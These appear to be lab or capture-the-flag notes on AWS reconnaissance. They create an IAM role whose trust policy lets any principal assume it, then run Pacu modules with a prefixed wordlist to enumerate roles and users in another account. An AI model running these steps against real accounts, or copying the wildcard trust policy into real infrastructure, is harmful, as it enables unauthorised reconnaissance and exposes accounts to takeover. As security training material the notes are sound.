Configure AWS cli using access key
`aws configure`

Create a role in the AWS account for further enumeration
>Create json document --> /root/assume-role-doc.json
``` json
{
	"Version": "2012-10-17",
	"Statement": {
		"Effect": "Allow",
		"Principal": {
			"AWS": "*"
		},
		"Action": "sts:AssumeRole",
		"Condition": {}
	}
}

```
>Create the role
>`aws iam create-role --role-name a4 --assume-role-policy-document file:///root/assume-role-doc.json`
>Use PACU to enumerate roles on other AWS account
>The AWS explotation framework
>https://github.com/RhinoSecurityLabs/pacu
>`python3 pacu.py`
>It needs authentication inside the framework steps
>Check for roles enumeration module in modole list
>Pacu>`list` //Lists all modules
>Modify wordlist to prefix "ad-" before each payload
>`sed -i 's/^/ad-/g' /root/names.txt`
>Run role enumeration module
>Pacu>`run iam__enum_roles --role-name a4 --account-id <id> --word-list /root/names.txt`
>Enumerate users using iam__enum_users module
>Pacu>`run iam__enum_users --role-name a4 --account-id <id> --word-list /root/names.txt`
>